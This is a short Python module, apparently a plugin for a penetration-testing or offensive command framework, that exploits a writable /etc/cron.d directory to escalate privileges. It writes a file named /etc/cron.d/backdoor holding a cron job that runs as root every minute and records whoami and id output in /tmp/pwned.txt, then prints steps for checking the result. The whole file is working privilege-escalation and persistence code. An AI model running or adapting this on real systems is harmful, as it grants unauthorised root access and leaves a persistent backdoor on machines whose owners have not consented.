from .abc import Command
import subprocess

class CronPrivesc(Command):
    """Privilege escalation via writable cron.d folder"""

    def do_command(self, lines: str, *args):
        results = []

        # Write malicious cron job that creates a root-owned proof file
        cron_job = "* * * * * root whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt\n"
        
        try:
            with open("/etc/cron.d/backdoor", "w") as f:
                f.write(cron_job)
            results.append("[+] Cron job written to /etc/cron.d/backdoor")
        except Exception as e:
            results.append(f"[-] Failed to write cron job: {e}")
            return "\n".join(results)

        # Wait a minute then read the proof
        results.append("[*] Cron job planted. Wait 60 seconds then check /tmp/pwned.txt")
        results.append("[*] Run: cat /tmp/pwned.txt")
        results.append("[*] It should show 'root' proving escalation")

        return "\n".join(results)